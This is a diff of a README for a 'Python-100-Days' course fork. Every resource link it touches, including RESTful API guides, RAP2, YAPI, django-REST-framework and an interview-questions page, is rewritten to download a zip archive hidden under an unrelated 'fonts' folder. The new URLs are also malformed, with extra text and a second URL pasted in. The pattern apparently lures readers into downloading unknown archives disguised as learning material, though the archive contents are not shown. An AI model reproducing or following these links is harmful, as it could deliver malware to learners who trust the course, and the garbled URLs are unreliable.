-   - [RESTful API设计指南](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
-   - [RESTful API最佳实践](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
+   - [理解RESTful架构](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+   - [RESTful API设计指南](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+   - [RESTful API最佳实践](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
 2. API接口文档的撰写
-   - [RAP2](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
-   - [YAPI](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)
-3. [django-REST-framework](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip)的应用
+   - [RAP2](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+   - [YAPI](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)
+3. [django-REST-framework](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip)的应用
 
 ##### 项目中的重点难点剖析
 
@@ -616,5 +616,5 @@ Python在以下领域都有用武之地。
 
 #### 第99天：[面试中的公共问题](./Day91-100/99.面试中的公共问题.md)
 
-#### 第100天：[Python面试题实录](https://github.com/ZHThinker/Python-100-Days/raw/refs/heads/master/公开课/文档/年薪50W+的Python程序员如何写代码/code/Java/opencourse/src/Days_Python_2.2.zip面试题实录.md)
+#### 第100天：[Python面试题实录](https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip公开课/文档/年薪50W+的Python程序员如何写代码https://raw.githubusercontent.com/ZHThinker/Python-100-Days/master/Day21-30/code/new/web1901/fonts/Days-Python-3.8.zip面试题实录.md)
 
